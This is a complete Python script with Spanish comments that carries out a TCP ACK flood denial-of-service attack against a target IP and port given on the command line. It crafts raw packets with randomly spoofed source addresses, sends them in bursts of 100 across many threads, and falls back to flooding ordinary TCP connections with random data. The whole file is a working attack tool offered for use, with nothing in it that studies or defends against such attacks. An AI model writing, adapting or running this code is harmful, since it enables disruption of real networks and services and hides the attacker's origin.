import socket
import random
import sys
import time
import threading
import os
import struct
import select

class TCPAckFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.total_packets = 0
        self.lock = threading.Lock()
        
    def get_cpu_count(self):
        try:
            cpus = os.cpu_count() or 4
            return cpus * 4
        except:
            return 16
    
    def create_ack_packet(self, src_ip, src_port, seq, ack_seq):
        """Crear paquete TCP con flag ACK (spoofed)"""
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20 + 1400  # IP header + TCP header + data
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(self.target_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
            ip_saddr, ip_daddr)
        
        # TCP Header con ACK flag
        tcp_source = src_port
        tcp_dest = self.target_port
        tcp_seq = seq
        tcp_ack_seq = ack_seq
        tcp_doff = 5
        tcp_flags = 0x10  # ACK flag
        tcp_window = socket.htons(65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Datos grandes para ancho de banda
        data = random._urandom(1400)
        
        return ip_header + tcp_header + data
    
    def tcp_ack_worker_c(self, worker_id):
        """Worker TCP ACK estilo C - máxima potencia"""
        end_time = time.time() + self.duration
        seed = int(time.time()) ^ worker_id ^ (worker_id << 16)
        random.seed(seed)
        
        dst = (self.target_ip, self.target_port)
        packet_count = 0
        
        # Crear socket raw para spoofing
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            use_raw = True
        except:
            use_raw = False
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        while time.time() < end_time and self.running:
            for attempt in range(500):
                if time.time() >= end_time:
                    break
                
                try:
                    if use_raw:
                        # Spoofed ACK packets
                        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        src_port = random.randint(1024, 65535)
                        seq = random.randint(0, 4294967295)
                        ack_seq = random.randint(0, 4294967295)
                        
                        packet = self.create_ack_packet(src_ip, src_port, seq, ack_seq)
                        
                        for _ in range(100):  # Ráfaga de 100 paquetes
                            sock.sendto(packet, (self.target_ip, 0))
                            packet_count += 1
                    else:
                        # Fallback a TCP normal
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        s.settimeout(0.001)
                        s.setblocking(False)
                        
                        try:
                            s.connect(dst)
                        except BlockingIOError:
                            pass
                        
                        _, ready, _ = select.select([], [s], [], 0.001)
                        
                        if ready:
                            data = random._urandom(65535)
                            while time.time() < end_time:
                                try:
                                    s.send(data)
                                    packet_count += 1
                                except:
                                    break
                        
                        s.close()
                    
                except Exception as e:
                    continue
            
            # Actualizar contador global
            with self.lock:
                self.total_packets += packet_count
            packet_count = 0
        
        if use_raw:
            sock.close()
    
    def start_attack(self):
        num_threads = self.get_cpu_count()
        
        print(f"[🔥] TCP ACK FLOOD - MODO C")
        print(f"[🎯] Target: {self.target_ip}:{self.target_port}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[🧵] Threads: {num_threads}")
        
        # Probar raw sockets
        try:
            test = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            test.close()
            print(f"[✅] Usando ACK spoofing (raw sockets)")
        except:
            print(f"[⚠️] Usando ACK normales (sin spoofing)")
        
        # Iniciar workers
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.tcp_ack_worker_c, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Esperar
        time.sleep(self.duration)
        self.running = False
        
        with self.lock:
            total = self.total_packets
        
        print(f"\n[✅] Total paquetes ACK: {total:,}")

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 tcpack.py <ip> <port> <time>")
        print("Ejemplo: python3 tcpack.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    flood = TCPAckFlood(target_ip, target_port, duration)
    flood.start_attack()

if __name__ == "__main__":
    main()
